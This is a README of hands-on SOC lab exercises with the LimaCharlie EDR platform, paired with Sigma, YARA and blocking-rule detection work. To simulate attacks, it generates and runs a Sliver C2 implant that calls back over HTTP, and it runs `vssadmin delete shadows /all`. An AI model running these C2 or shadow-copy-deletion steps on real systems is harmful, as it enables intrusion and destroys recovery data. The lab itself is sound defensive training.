# LimaCharlie SOC Analyst Lab Project

This repository contains detailed lab instructions for completing a series of hands‑on exercises with the **LimaCharlie SecOps Cloud Platform**.  It is structured to help you deploy sensors, ingest Windows Sysmon logs, enable Sigma rulesets, interact with a Sliver C2 server, and craft advanced detection and blocking rules using Detection & Response (D&R) and YARA.

## Setup and Deploy LimaCharlie

1. **Create a free LimaCharlie account** and sign in.  Fill in the brief role questionnaire however you prefer.
2. **Create an organization** in LimaCharlie:
   - Choose a unique name of your choosing.
   - Select the data residency region closest to you.
   - Disable *Demo Configuration Enabled*.
   - Choose *No pre‑configurations* for the template.
3. **Add a sensor** to your organization:
   - On the “Sensors” page, click **Add Sensor**.
   - Select the **Endpoint** tab, choose **Windows**, and enter a description such as `Windows VM - Lab`.
   - Click **Create**, then select the installation key.
   - Choose the **x86‑64 (.exe)** sensor.  Do **not** download or install it yet; installation will be covered later.
4. Start your lab virtual machines (VMs).  Ensure the **Windows VM** is running — you'll install the LimaCharlie sensor on it in the next section.

## Install the LimaCharlie EDR Agent on Windows

1. **Launch the Windows VM** and open an administrative command prompt.
2. Navigate to the directory where `lc_sensor.exe` is located:
   ```cmd
   cd C:\Users\Administrator\Downloads
   ```
3. Run the installation command, substituting your actual installation key:
   ```cmd
   .\lc_sensor.exe -i [your_installation_key]
   ```
   When the command completes successfully, the agent will begin reporting in.  You should see the sensor in the LimaCharlie UI.

## Ingest Windows Sysmon Logs

1. In the LimaCharlie console, go to **Sensors → Artifact Collection** and click **Add Artifact Collection Rule**.
2. Set the following values:
   - **Name:** `windows-sysmon-logs`
   - **Patterns:** `wel://Microsoft-Windows-Sysmon/Operational:*`
   - **Retention Period:** `10`
   - **Platforms:** `Windows`
3. Click **Save**.  LimaCharlie will begin shipping Sysmon event logs alongside its own telemetry.  Sysmon logs provide rich endpoint telemetry and are used by the Sigma rules enabled in the next section.

## Enable the Sigma EDR Ruleset

1. In the LimaCharlie UI, navigate to **Add‑ons → Extensions**.
2. Search for `ext-sigma` and click **Subscribe**.  This adds the open source Sigma ruleset to help detect malicious behaviors.

## Set Up and Use Sliver C2

1. **Launch your Linux VM** and open a terminal.
2. Become root and verify the Sliver server is running:
   ```bash
   sudo su
   systemctl status sliver
   ```
   If it is not running, start it with `systemctl start sliver`.
3. Launch the Sliver client:
   ```bash
   sliver
   ```
4. Ensure that an HTTP listener is running by typing `jobs`.  If no listener is active, start one with `http`.
5. Generate a C2 implant.  Replace `<linux_vm_ip>` with your Linux VM’s IP address:
   ```bash
   generate --http <linux_vm_ip> --save /var/www/payloads
   ```
   This creates a Sliver implant binary and stores it in `/var/www/payloads`.  Note the unique name of the generated file.
6. Back in your Windows VM, open Edge and browse to `http://<linux_vm_ip>:8080`.  Download your implant by clicking on its filename.  Edge will warn that the file is uncommonly downloaded; choose **Keep** and then **Keep anyway**.
7. Run the implant executable on the Windows VM.
8. Back in the Sliver client on the Linux VM, type `sessions` to view active sessions.  Use `use [session_id]` to interact with your new C2 session.

From within the Sliver session, you can run basic commands such as:

- `info` – Display session details
- `whoami` – Show the user and privileges
- `pwd` – Show the working directory
- `netstat` – Display network connections (may take some time)
- `ps -T` – List running processes, with Sliver highlighting its own process and security tools

## Explore LimaCharlie Telemetry

Use the LimaCharlie UI to analyze sensor telemetry:

1. Under **Sensors**, click your active Windows sensor.  Use the left‑side menu to explore the **Processes**, **Network**, **File System**, and **Timeline** tabs.
2. In **Processes**, examine the process tree; note signed vs. unsigned binaries.
3. In **Network**, search for your implant name or C2 IP address to identify suspicious connections.
4. In **File System**, navigate to `C:\Users\Administrator\Downloads` and use VirusTotal to investigate suspicious executables.  Remember: “Item not found” in VirusTotal does not guarantee a file is benign — trust your analysis.
5. In **Timeline**, filter events by known indicators of compromise (IOCs) such as the implant name or C2 IP.  Identify events such as creation and launch of the implant and associated network activity.

## Additional Lessons: Credential Theft, Ransomware Blocking, and YARA Scanning

This project includes additional labs that build upon the environment you’ve already set up.  They focus on creating detection and blocking rules in LimaCharlie and using YARA signatures to scan files and memory.

### Detecting and Blocking Ransomware (Volume Shadow Copy Deletion)

**Prerequisites:**

- You have completed all setup steps, and your Sliver implant is running and connected to the Sliver server.
- If you shut down your lab, restart the Sliver client on Linux, start the HTTP listener, and relaunch your C2 implant on Windows.  Use `sessions` and `use [session_id]` to enter the session.

**Training Objective:**

Learn how to craft a blocking rule in LimaCharlie that will terminate processes attempting to delete Volume Shadow Copies.  Deleting shadow copies is a common technique used by ransomware to prevent recovery.  It is relatively rare in normal environments, making it a good candidate for a blocking rule.

**Baselining:**  Before enabling blocking rules, baseline your environment with an alert‑only rule to eliminate false positives.  Tune and test over days or weeks before enabling blocking.

**Attack Simulation:**

1. In your Sliver C2 session, drop to a native Windows shell:
   ```
   shell
   ```
   When prompted with “This action is bad OPSEC, are you an adult?” type `Y` and press **Enter**.
2. Run the command that deletes Volume Shadow Copies:
   ```
   vssadmin delete shadows /all
   ```
   The command may succeed or fail depending on whether shadow copies exist; either way, it produces telemetry.
3. Verify your shell is still active by running `whoami`.  Keep this terminal open.

**Identify Detections:**

1. In LimaCharlie, go to **Detections** and look for a Sigma rule that triggered on the shadow copy deletion.  Expand the detection and read the metadata — Sigma rules often include references that explain why they exist.
2. Use the **Timeline** to view the raw event and confirm exactly what command line triggered the detection.

**Craft a Detection & Response (D&R) Rule:**

1. In the LimaCharlie UI, navigate to **Automation → D&R Rules** and create a new rule.
2. Use the detection details from the Sigma rule as a template.  In the **Respond** section, add the following actions to both report the detection and kill the offending process:

   ```yaml
   - action: report
     name: vss_deletion_kill_it
   - action: task
     command:
       - deny_tree
       - <<routing/parent>>
   ```
   The `deny_tree` task terminates the parent process responsible for the `vssadmin` command.  Test by running `vssadmin delete shadows /all` again.  Your shell should hang when you run `whoami`, indicating the parent process was killed.  Confirm the rule fired in the **Detections** tab.

### YARA Scanning and Automated Malware Detection

**Training Objective:**

Leverage YARA signatures within LimaCharlie to automatically scan for Sliver C2 malware.  You will create YARA rules, build D&R rules to respond to detections, and test scanning both files and processes launched from specific directories.

**Add YARA Signatures:**

1. Navigate to **Automation → YARA Rules** and click **Add Yara Rule**.
2. Create a rule named **`sliver`** (name must match exactly) and paste the contents of the provided gist into the Rule block.  Save the rule.
3. Add another rule named **`sliver-process`** and paste the contents of the second gist.  Save the rule.

**Create D&R Rules for YARA Detections:**

1. Go to **Automation → D&R Rules** and click **New Rule**.
2. First rule – alert on YARA detections without a `PROCESS` object:

   - **Detect block:**
     ```yaml
     event: YARA_DETECTION
     op: and
     rules:
       - not: true
         op: exists
         path: event/PROCESS/*
       - op: exists
         path: event/RULE_NAME
     ```
   - **Respond block:**
     ```yaml
     - action: report
       name: YARA Detection {{ .event.RULE_NAME }}
     - action: add tag
       tag: yara_detection
       ttl: 80000
     ```
   - Save the rule with the title **`YARA Detection`**.

2. Second rule – alert on YARA detections involving a `PROCESS` object:

   - **Detect block:**
     ```yaml
     event: YARA_DETECTION
     op: and
     rules:
       - op: exists
         path: event/RULE_NAME
       - op: exists
         path: event/PROCESS/*
     ```
   - **Respond block:**
     ```yaml
     - action: report
       name: YARA Detection in Memory {{ .event.RULE_NAME }}
     - action: add tag
       tag: yara_detection_memory
       ttl: 80000
     ```
   - Save the rule with the title **`YARA Detection in Memory`**.

**Test File Scanning:**

1. On the Windows VM, open PowerShell and navigate to `C:\Users\Administrator\Downloads`:
   ```powershell
   cd ~\Downloads
   ls
   ```
2. Temporarily move all `.exe` files from Downloads to Documents:
   ```powershell
   Move-Item ~\Downloads\*.exe ~\Documents\
   ```
3. Move the `.exe` files back into Downloads to generate a `NEW_DOCUMENT` event:
   ```powershell
   Move-Item ~\Documents\*.exe ~\Downloads\
   ```
4. Check the **Detections** tab.  You should see alerts for the EXE landing in Downloads and, shortly after, a YARA detection that identifies the Sliver implant.  If not, search the **Timeline** for `NEW_DOCUMENT` events.

**Test Process Scanning:**

1. In PowerShell, stop any existing Sliver processes:
   ```powershell
   Get-Process [payload_name] | Stop-Process
   ```
   Replace `[payload_name]` with your implant’s filename without the `.exe` extension.
2. Execute the implant again to create a `NEW_PROCESS` event:
   ```powershell
   C:\Users\Administrator\Downloads\[payload_name].exe
   ```
3. In **Detections**, you should see an alert for execution from the Downloads directory followed by a **YARA Detection in Memory**.  This demonstrates that LimaCharlie can automatically detect and report Sliver implants the moment they are run.

---

These labs demonstrate how to deploy LimaCharlie sensors, ingest Sysmon logs, enable Sigma and YARA detection rules, use Sliver for attacker simulation, and create sophisticated blocking rules.  With careful baselining and testing, you can extend these techniques to detect and mitigate a wide variety of threats.
